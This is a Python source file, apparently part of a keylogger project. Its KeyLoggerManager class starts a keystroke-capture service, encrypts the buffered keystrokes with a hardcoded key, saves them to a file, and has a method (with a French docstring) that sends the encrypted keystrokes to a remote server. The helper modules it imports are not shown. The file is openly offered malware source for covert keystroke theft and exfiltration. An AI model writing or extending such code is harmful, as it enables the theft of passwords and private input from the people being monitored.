import time
from KeyService import KeyLoggerService
from FileWriter import FileWriter
from NetworkWriter import NetworkWriter
from Encryptor import Encryptor

class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.encryptor = Encryptor("secret_key")

    def run(self):

        self.service.start_logging()
        try:
            while self.service.running:
                if self.service.buffer.is_full():
                    self.save_locally()
                time.sleep(1)
        except KeyboardInterrupt:
            self.service.stop_logging()
            print("KeyLogger stopped.")

    def save_locally(self):

        logged_keys = "".join(self.service.buffer.get_data())
        encrypted_data = self.encryptor.encrypt(logged_keys)
        self.file_writer.write(encrypted_data)
        self.service.buffer.flush()

    def send_to_server(self):
        """Envoie les données chiffrées au serveur."""
        logged_keys = "".join(self.service.buffer.get_data())
        encrypted_data = self.encryptor.encrypt(logged_keys)
        self.network_writer.send(encrypted_data)
keyManager = KeyLoggerManager()
keyManager.run()
